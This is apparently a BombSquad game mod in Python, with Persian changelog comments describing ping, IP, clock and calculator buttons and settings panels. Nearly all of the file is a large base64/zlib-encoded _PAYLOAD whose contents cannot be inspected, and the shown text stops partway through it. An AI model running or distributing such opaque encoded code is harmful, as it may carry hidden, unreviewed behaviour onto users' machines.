# ModPoya.py - API 9
# ساخته شده توسط Poya Azrael
# @AzraelMods لینک چنل
#
# --- آپدیت‌های این نسخه ---
# 1) دکمه‌ی ساعت: حالا تاریخ شمسی هم می‌فرسته و کنار ساعت از ☀️ (روز) یا 🌑 (شب) استفاده می‌کنه.
# 2) یه مود «ماشین حساب حرفه‌ای» اضافه شد: دکمه‌ی چهارم (Calc) یه پنل وسط صفحه باز می‌کنه،
#    همه‌ی دکمه‌ها (اعداد، عملگرها، تایید، بستن) داخل خود پنل هستن، پشت پنل هم چیز اضافه‌ای کشیده نمیشه.
#    برای ارسال نتیجه به چت باید دکمه‌ی «=» رو دو بار پشت سر هم بزنی (بار اول محاسبه می‌کنه، بار دوم می‌فرسته).
# 3) تنظیمات رنگ آیکون‌ها (پس‌زمینه + نوشته‌ی هر ۴ دکمه) اضافه شد و از داخل خود بازی قابل تغییره؛
#    دیگه لازم نیست برای تغییر رنگ‌ها این فایل پایتون رو باز/ویرایش کنی.
#    برای بازکردنش: توی صفحه‌ی افزونه‌ها (Plugins) روی همین مود بزن، دکمه‌ی «تنظیمات» که کنارش
#    ظاهر میشه رو بزن (دقیقاً مثل چیزی که برای ModPiyamPoya.SmartChatSplitter می‌بینی).
#    هیچ دکمه‌ی پنجمی به پنجره‌ی پارتی اضافه نشده.
# 4) دکمه‌های تنظیمات رنگ بزرگ‌تر و با فاصله‌ی بیشتر شدن (راحت‌تر لمس میشن) و کل پنل
#    اسکرول‌پذیره تا هر چندتا دکمه/رنگ بعداً اضافه بشه، جا داشته باشه بدون تغییر طراحی.
#    همچنین یه «هاب تنظیمات» اضافه شد: دکمه‌ی «تنظیمات» حالا اول یه لیست شماره‌دار نشون
#    می‌ده (فعلاً فقط «۱. رنگ آیکون‌ها») و هر پنل تنظیماتِ جدیدی که بعداً اضافه بشه،
#    خودکار به‌صورت «۲.»، «۳.» و... کنارش قرار می‌گیره.
# 5) پنل تنظیماتِ جدید «۲. جا / اندازه / شکل آیکون‌ها» اضافه شد: از همینجا می‌تونی
#    موقعیت (X/Y)، اندازه و شکلِ هر ۴ دکمه (Ping/IP/Time/Calc) رو بین مربع و مستطیل
#    عوض کنی (این نسخه از بازی از دکمه‌ی دایره‌ای پشتیبانی نمی‌کنه، برای همین حذف
#    شد). تغییرات هم ذخیره میشن، هم جا/اندازه فوری روی پنجره‌ی بازِ پارتی اعمال میشن.

from __future__ import annotations

import re
import socket
import threading
import time
import weakref

import babase
import bauiv1 as bui
import bascenev1 as bs
from babase import Plugin
from bauiv1 import buttonwidget as bw, apptimer as teck, screenmessage as push, get_special_widget as gsw
from bauiv1lib import party

import base64 as _b64
import zlib as _zlib

_PAYLOAD = (
    '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'
